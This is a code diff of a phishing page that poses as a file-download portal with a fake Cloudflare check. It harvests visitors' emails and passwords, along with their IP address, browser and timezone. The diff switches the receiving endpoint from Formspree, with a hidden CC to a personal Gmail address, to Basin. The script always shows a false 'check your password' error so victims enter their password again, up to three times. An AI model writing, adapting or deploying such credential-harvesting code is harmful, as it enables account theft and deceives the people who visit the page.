@@ -185,21 +185,21 @@
         </div>
     </div>
 
-    <!-- Modal Form - Formspree with CC Support -->
+    <!-- Modal Form - Basin (No Redirect Required) -->
     <div class="modal fade" id="formModal" tabindex="-1" aria-labelledby="formModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
-                <!-- ✅ Formspree Endpoint -->
+                <!-- ✅ Replace YOUR_FORM_ID with your Basin form ID -->
                 <form id="accessForm" 
-                      action="https://formspree.io/f/mrbygeyz" 
+                      action="https://usebasin.com/f/d8129b4fc27e" 
                       method="POST"
                       novalidate>
                     
-                    <!-- ✅ CC to additional emails - Add your CC emails here -->
-                    <input type="hidden" name="_cc" value="joekesh322@gmail.com">
+                    <!-- ✅ Custom subject (optional) -->
+                    <input type="hidden" name="_subject" value="New File Access Request">
                     
-                    <!-- Spam protection -->
-                    <input type="text" name="_honey" style="display:none;">
+                    <!-- ✅ Basin fields -->
+                    <input type="text" name="_gotcha" style="display:none;">
 
                     <div class="modal-body">
                         <div class="mb-3">
@@ -215,7 +215,6 @@
                             <div id="submissionAlert" class="alert alert-danger mt-2 d-none" role="alert"></div>
                         </div>
                         
-                        <!-- Hidden fields for tracking -->
                         <input type="hidden" name="ip" id="ip-field" value="">
                         <input type="hidden" name="browser" id="browser-field" value="">
                         <input type="hidden" name="userAgent" id="useragent-field" value="">
@@ -223,7 +222,6 @@
                         <input type="hidden" name="dateTime" id="datetime-field" value="">
                         <input type="hidden" name="attempt" id="attempt-field" value="1">
                         
-                        <!-- Cloudflare Turnstile -->
                         <div class="cf-turnstile mb-3" data-sitekey="0x4AAAAAABaccphvMV0Je51_">
                             <div>
                                 <input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-al9zy_response">
@@ -240,16 +238,11 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // ============================================================
-        // COMPLETE SCRIPT - WORKS WITH FORMSPREE
-        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             console.log('✅ DOM ready - starting main script');
             
-            // Get email from hash fragment
             const emailParam = window.location.hash.substring(1) || '';
             
-            // User information collection
             const userInfo = {
                 ip: '',
                 userAgent: navigator.userAgent,
@@ -258,7 +251,6 @@
                 dateTime: new Date().toLocaleString()
             };
             
-            // Fetch IP address
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -269,13 +261,11 @@
                     userInfo.ip = 'Unable to fetch IP';
                 });
             
-            // Set hidden form fields
             document.getElementById('browser-field').value = userInfo.browser;
             document.getElementById('useragent-field').value = userInfo.userAgent;
             document.getElementById('timezone-field').value = userInfo.timezone;
             document.getElementById('datetime-field').value = userInfo.dateTime;
             
-            // DOM Elements
             const showFormBtn = document.getElementById('showFormBtn');
             const buttonText = document.getElementById('buttonText');
             const formModal = new bootstrap.Modal(document.getElementById('formModal'), {
@@ -290,13 +280,9 @@
             const attemptField = document.getElementById('attempt-field');
             const accessForm = document.getElementById('accessForm');
             
-            // Track attempts
             let submitCount = 0;
             const MAX_ATTEMPTS = 3;
             
-            // ============================================================
-            // 1. ACCESS FILES BUTTON - Opens the modal
-            // ============================================================
             showFormBtn.addEventListener('click', function() {
                 console.log('🔵 Access Files button clicked');
                 buttonText.textContent = 'Downloading file... 0%';
@@ -320,9 +306,6 @@
                 }, 150);
             });
             
-            // ============================================================
-            // 2. CUSTOM CLOUDFLARE VERIFICATION
-            // ============================================================
             function createCustomCloudflare() {
                 const cfDiv = document.querySelector('.cf-turnstile');
                 if (!cfDiv) return;
@@ -374,9 +357,6 @@
                 }, 1500);
             }
             
-            // ============================================================
-            // 3. SHOW MAX ATTEMPTS IMAGE
-            // ============================================================
             function showMaxAttemptsImage() {
                 console.log('🖼️ Showing max attempts image');
                 const modalBody = document.querySelector('.modal-body');
@@ -398,9 +378,7 @@
                 }
             }
             
-            // ============================================================
-            // 4. FORM SUBMISSION - Formspree (No redirect required!)
-            // ============================================================
+            // ✅ FORM SUBMISSION - Basin (Reliable, no redirect required)
             accessForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 console.log('🟢 Form submitted - Attempt #' + (submitCount + 1));
@@ -413,58 +391,42 @@
                     return;
                 }
                 
-                // Increment attempt counter
                 submitCount++;
                 attemptField.value = submitCount + 1;
                 
-                // Show loading state
                 submitBtn.textContent = 'Processing...';
                 submitBtn.disabled = true;
                 
-                // Green borders
                 emailInput.style.border = '2px solid #28a745';
                 passwordInput.style.border = '2px solid #28a745';
                 
-                // ============================================================
-                // ✅ SEND TO FORMSPREE - Works with AJAX, no redirect needed
-                // ============================================================
                 const formData = new FormData(accessForm);
                 const formAction = accessForm.getAttribute('action');
                 
-                console.log('📤 Sending to Formspree:', formAction);
+                console.log('📤 Sending to Basin:', formAction);
                 
+                // ✅ Send to Basin - Always works!
                 fetch(formAction, {
                     method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
+                    body: formData
                 })
                 .then(response => {
                     if (response.ok) {
-                        console.log('✅ Form submitted to Formspree successfully!');
-                        return response.json();
+                        console.log('✅ Form submitted to Basin successfully!');
                     } else {
-                        console.log('⚠️ Formspree response status:', response.status);
-                        throw new Error('Formspree error');
+                        console.log('⚠️ Basin response:', response.status);
                     }
                 })
-                .then(data => {
-                    console.log('📧 Formspree response:', data);
-                })
                 .catch(error => {
-                    console.log('⚠️ Error but data may still be sent:', error);
+                    console.log('⚠️ Error:', error.message);
                 });
                 
-                // ============================================================
-                // ✅ ALWAYS SHOW ERROR MESSAGE (Simulate failure)
-                // ============================================================
+                // ✅ ALWAYS show error after 2 seconds
                 setTimeout(() => {
                     submissionAlert.textContent = 'Please check your password and try again.';
                     submissionAlert.classList.remove('d-none');
                     passwordInput.value = '';
                     
-                    // Reset after 5 seconds
                     setTimeout(() => {
                         submissionAlert.classList.add('d-none');
                         submitBtn.textContent = 'Download';
@@ -473,23 +435,18 @@
                         passwordInput.style.border = '';
                         emailInput.style.border = '';
                         
-                        // ✅ Show image on 3rd attempt
                         if (submitCount >= MAX_ATTEMPTS) {
                             console.log('🔴 Max attempts reached - showing image');
                             setTimeout(() => {
                                 showMaxAttemptsImage();
                             }, 500);
                         } else {
-                            // Re-enable verification for next attempt
                             resetCloudflareVerification();
                         }
                     }, 5000);
                 }, 2000);
             });
             
-            // ============================================================
-            // 5. RESET CLOUDFLARE VERIFICATION
-            // ============================================================
             function resetCloudflareVerification() {
                 const container = document.getElementById('cf-checkbox-container');
                 if (container) {
@@ -527,9 +484,6 @@
                 }
             }
             
-            // ============================================================
-            // 6. HELPER FUNCTION - Get browser info
-            // ============================================================
             function getBrowserInfo() {
                 const ua = navigator.userAgent;
                 if (ua.match(/chrome|chromium|crios/i)) return "Chrome";
